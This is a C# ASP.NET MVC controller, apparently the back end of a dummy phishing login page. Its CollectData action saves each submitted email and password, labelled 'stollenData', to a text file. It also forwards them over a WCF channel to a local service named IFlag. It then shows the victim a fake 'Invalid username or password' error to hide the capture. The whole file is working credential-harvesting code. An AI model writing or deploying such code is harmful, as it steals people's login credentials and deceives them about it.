using Common;
using Contracts;
using System;
using System.IO;
using System.ServiceModel;
using System.Web.Hosting;
using System.Web.Mvc;

namespace WebsiteDummy.Controllers
{
    public class HomeController : Controller
    {
        static IFormMessage channel = null;

        public ActionResult Index()
        {

            return View();
        }

        [HttpPost]
        public ActionResult CollectData(string email, string password)
        {

            if (email == string.Empty || password == string.Empty)
            {

                ViewBag.error = "Invalid username or password";
                return View("Index");
            }


            string stollenData = email + ";" + password + ";" + DateTime.Now.ToString();

            //TODO: here
            string path = HostingEnvironment.MapPath("~/App_Data/database.txt");
            FileStream stream = new FileStream(path, FileMode.Append);



            using (StreamWriter sw = new StreamWriter(stream))
            {
                sw.WriteLine(stollenData);
            }


            ChannelFactory<IFormMessage> factory = new ChannelFactory<IFormMessage>(new NetTcpBinding(), new EndpointAddress("net.tcp://localhost:5000/IFlag"));
            if (channel == null)
            {
                channel = factory.CreateChannel();
            }

            channel.SendData(new FormData() { Username = email, Password = password });


            ViewBag.error = "Invalid username or password";
            return View("Index");
        }


    }
}